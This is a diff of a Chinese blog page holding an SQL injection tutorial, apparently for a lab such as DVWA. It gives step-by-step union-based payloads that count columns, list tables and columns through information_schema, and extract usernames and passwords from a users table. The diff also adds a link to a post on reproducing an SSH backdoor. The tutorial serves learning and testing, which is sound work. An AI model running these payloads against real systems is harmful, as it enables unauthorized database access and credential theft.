@@ -356,19 +356,25 @@
 <h2 id="2-猜解SQL查询语句中的字段数"><a href="#2-猜解SQL查询语句中的字段数" class="headerlink" title="2.猜解SQL查询语句中的字段数"></a>2.猜解SQL查询语句中的字段数</h2><p>判断字段数：</p>
 <pre><code>1′ or 1=1 order by 1,2,3,4,5 #
 </code></pre><p>数字累加，直到不出结果或者报错。</p>
+<hr>
+<p><strong>注释常常使用<code>--+</code>或者<code>#</code>或者<code>%23</code></strong></p>
+<hr>
 <p>或者用：</p>
 <pre><code>-1′ union select 1,2 #
-</code></pre><p>顺路进行下一步</p>
-<hr>
+</code></pre><hr>
 <p><strong>两个sql语句进行联合操作时，当前一个语句选择的内容为空，我们这里就将后面的语句的内容显示出来</strong></p>
 <hr>
+<p>顺路进行下一步</p>
 <h2 id="3-确定显示的字段顺序"><a href="#3-确定显示的字段顺序" class="headerlink" title="3.确定显示的字段顺序"></a>3.确定显示的字段顺序</h2><pre><code>-1′ union select 1,2 #
 </code></pre><h2 id="4-获取当前数据库"><a href="#4-获取当前数据库" class="headerlink" title="4.获取当前数据库"></a>4.获取当前数据库</h2><pre><code>-1′ union select 1,database() #
 </code></pre><h2 id="5-获取数据库中的表"><a href="#5-获取数据库中的表" class="headerlink" title="5.获取数据库中的表"></a>5.获取数据库中的表</h2><pre><code>-1′ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #
 </code></pre><p>从information_schema中查找表名</p>
-<h2 id="6-获取表中的字段名"><a href="#6-获取表中的字段名" class="headerlink" title="6.获取表中的字段名"></a>6.获取表中的字段名</h2><pre><code>1′ union select 1,group_concat(column_name) from information_schema.columns where table_name=’users’ #
+<hr>
+<p><strong>进行联合查询时要将查询用的语句放在最后一项</strong></p>
+<hr>
+<h2 id="6-获取表中的字段名"><a href="#6-获取表中的字段名" class="headerlink" title="6.获取表中的字段名"></a>6.获取表中的字段名</h2><pre><code>-1′ union select 1,group_concat(column_name) from information_schema.columns where table_name=’users’ #
 </code></pre><p>爆users表内的表名</p>
-<h2 id="7-下载数据"><a href="#7-下载数据" class="headerlink" title="7.下载数据"></a>7.下载数据</h2><pre><code>1′ or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #
+<h2 id="7-下载数据"><a href="#7-下载数据" class="headerlink" title="7.下载数据"></a>7.下载数据</h2><pre><code>-1′ or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #
 </code></pre><p>从users里面取出所有用户的user_id,first_name,last_name,password的数据</p>
 
       
@@ -409,6 +415,10 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/05/15/SSH后门复现/" rel="prev" title="SSH后门复现">
+                SSH后门复现 <i class="fa fa-chevron-right"></i>
+              </a>
             
           </div>
         </div>
@@ -482,7 +492,7 @@
                 
                   <a href="/archives">
                 
-                    <span class="site-state-item-count">9</span>
+                    <span class="site-state-item-count">10</span>
                     <span class="site-state-item-name">日志</span>
                   </a>
                 </div>
